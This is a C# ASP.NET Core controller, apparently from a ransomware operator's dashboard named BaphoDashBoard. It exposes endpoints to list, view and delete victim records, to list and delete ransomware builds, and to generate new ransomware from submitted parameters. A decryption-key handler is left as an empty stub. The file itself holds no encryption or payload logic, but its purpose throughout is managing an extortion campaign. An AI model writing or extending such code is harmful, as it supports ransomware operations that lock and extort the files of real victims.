﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using BaphoDashBoard.Models;
using System.Security.Cryptography;
using Microsoft.AspNetCore.Mvc;
using System.Text;
using BaphoDashBoard.DAL.Services;
using BaphoDashBoard.ViewModels;
using BaphoDashBoard.DTO;
using Microsoft.AspNetCore.Http;

namespace BaphoDashBoard.Controllers
{
    public class ManagementController : Controller
    {
        private readonly ManagementService _service;
        public ManagementController(ManagementService service)
        {
            _service = service;
        }
        public async Task<IActionResult> Index()
        {
            var list = await _service.GetRecordList();
            return View(list);
        }

        public async Task<IActionResult> RansomwareList()
        {
            var ransomwaredeatils = await _service.GetRansomwareDetails();
            return View(ransomwaredeatils);
        }

        public IActionResult Create()
        {
            return View();
        }

        public async Task<ActionResult> Detail(int id)
        {
            var victimdetails = await _service.Details(id);
            return View(victimdetails);
        }

        [HttpPost]
        public async Task<IActionResult> DeleteVictim([FromBody] int id)
        {
            var result = await _service.DeleteVictim(id);
            return Json(result);
        }


        [HttpPost]
        public async Task<IActionResult> DeleteRansomware([FromBody] int id)
        {
            var result = await _service.DeleteRansom(id);
            return Json(result);
        }

        public async Task<IActionResult>GenerateRansomware([FromQuery] GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            {
                if(model != null)
                {
                    result = await _service.CreateRansomware(model);
                }
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return Json(result);
        }

        public async Task<AppResult> DecrypSecretKey([FromForm(Name = "fields")] IFormFile file)
        {
            AppResult result = new AppResult();
            try
            {

            }
            catch(Exception ex)
            {

            }
            return result;
        }

    }
}